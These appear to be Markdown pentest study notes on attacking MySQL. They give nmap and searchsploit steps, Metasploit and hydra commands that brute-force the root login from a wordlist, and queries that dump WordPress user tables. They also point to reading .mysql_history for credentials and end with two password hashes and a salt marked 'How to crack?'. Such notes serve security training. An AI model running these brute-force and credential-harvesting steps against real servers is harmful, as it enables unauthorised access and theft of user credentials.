# MySQL

- Basic nmap scan.
```
nmap -Pn -sV -sC -p3306 <ip>
```

- Check for existing exploits.
```
searchsploit MySQL <version>
```

- Check MySQL version.
```
use auxiliary/scanner/mysql/mysql_version
```

- Brute-force MySQL login using MSF.
  - Focus on root as other accounts may not have sufficient privileges for our intent.
  - root password can be NULL.
```
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE false
```

- Brute-force MySQL login using hydra.
```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql
```

- Brute-forcing can result in host being blocked.
  - Need pre-existing shell access to target and a MySQL account to run `mysqladmin flush-hosts`.
  - In general, avoid brute-forcing MySQL. Can test for NULL credentials manually.
```
[ERROR] Host '<hostname>' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
```

- Connect to MySQL.
  - Press Enter for password if NULL.
```
mysql -u root -p -h <ip>
```

```
show databases;
use <database>;
show tables;
select * from <table>;

use wordpress;
select * from wp_users;

# Web app user info in the database.
```

```
cat ~/.mysql_history

# History file may contain credentials.
```

##
```
$P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0
$P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/

Salt: G*=2"S^\529h#r7Y=aPP (from nmap scan)

# How to crack?
```
